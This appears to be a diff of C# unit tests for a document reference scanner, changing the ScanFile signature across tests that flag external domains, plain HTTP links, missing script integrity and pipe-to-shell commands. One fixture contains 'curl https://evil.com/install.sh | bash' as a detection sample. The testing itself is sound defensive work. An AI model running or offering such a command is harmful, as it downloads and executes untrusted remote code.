@@ -116,7 +116,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("Check out https://unknown-site.org/tool for more info.");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["microsoft.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["microsoft.com"]);
             Assert.Single(findings);
             Assert.Equal("EXTERNAL-DOMAIN", findings[0].Code);
             Assert.Contains("unknown-site.org", findings[0].Message);
@@ -130,7 +130,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("See https://learn.microsoft.com/dotnet for docs.");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["microsoft.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["microsoft.com"]);
             Assert.Empty(findings);
         }
         finally { CleanupFile(file); }
@@ -142,7 +142,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("Visit http://insecure-site.com/page for details.");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["insecure-site.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["insecure-site.com"]);
             Assert.Single(findings);
             Assert.Equal("HTTP-NOT-HTTPS", findings[0].Code);
         }
@@ -155,7 +155,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("curl https://evil.com/install.sh | bash");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["evil.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["evil.com"]);
             Assert.Contains(findings, f => f.Code == "PIPE-TO-SHELL");
         }
         finally { CleanupFile(file); }
@@ -167,7 +167,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("curl -sSL https://dot.net/v1/dotnet-install.sh | bash");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["dot.net"]);
+            var findings = ReferenceScanner.ScanFile(file, ["dot.net"]);
             Assert.DoesNotContain(findings, f => f.Code == "PIPE-TO-SHELL");
         }
         finally { CleanupFile(file); }
@@ -179,7 +179,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("Configure at https://your-server.com/api or https://{host}/path.");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, []);
+            var findings = ReferenceScanner.ScanFile(file, []);
             Assert.Empty(findings);
         }
         finally { CleanupFile(file); }
@@ -191,7 +191,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile("Run at http://localhost:5000/api.");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, []);
+            var findings = ReferenceScanner.ScanFile(file, []);
             Assert.Empty(findings);
         }
         finally { CleanupFile(file); }
@@ -204,7 +204,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile(content);
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, []);
+            var findings = ReferenceScanner.ScanFile(file, []);
             // Should flag external domain but NOT http-not-https inside fenced block
             Assert.DoesNotContain(findings, f => f.Code == "HTTP-NOT-HTTPS");
             Assert.Contains(findings, f => f.Code == "EXTERNAL-DOMAIN" && f.Message.Contains("some-external.com"));
@@ -219,7 +219,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile(content, ".html");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["cdn.example.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["cdn.example.com"]);
             Assert.Contains(findings, f => f.Code == "SCRIPT-NO-SRI");
         }
         finally { CleanupFile(file); }
@@ -232,7 +232,7 @@ public class ReferenceScannerTests
         var file = CreateTempFile(content, ".html");
         try
         {
-            var findings = ReferenceScanner.ScanFile(file, Path.GetDirectoryName(file)!, ["cdn.example.com"]);
+            var findings = ReferenceScanner.ScanFile(file, ["cdn.example.com"]);
             Assert.DoesNotContain(findings, f => f.Code == "SCRIPT-NO-SRI");
             Assert.Contains(findings, f => f.Code == "EXTERNAL-DOMAIN");
         }
